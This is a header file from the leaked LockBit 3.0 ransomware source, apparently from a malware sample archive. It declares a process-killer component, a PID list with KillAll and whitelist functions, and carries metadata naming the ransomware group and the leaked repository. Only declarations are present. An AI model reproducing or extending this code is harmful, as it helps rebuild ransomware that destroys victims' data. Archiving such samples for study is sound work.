/*
  name      LockBit 3.0 (Black)
  type      ransomware
  cve       —
  year      2022
  os        windows
  authors   LockBit Group
  source    https://github.com/Zzutiky666/LockBit (leaked source)
  archived  krisyotam
  notes     leaked by disgruntled affiliate Sept 2022; most prolific RaaS 2022-2024
 */

#pragma once
#include "common.h"
#include "queue.h"

namespace process_killer {

	typedef struct pid_ {

		DWORD dwProcessId;
		TAILQ_ENTRY(pid_) Entries;

	} PID, *PPID;
	
	typedef TAILQ_HEAD(, pid_) PID_LIST, * PPID_LIST;

	VOID KillAll(PPID_LIST PidList);
	VOID GetWhiteListProcess(PPID_LIST PidList);

}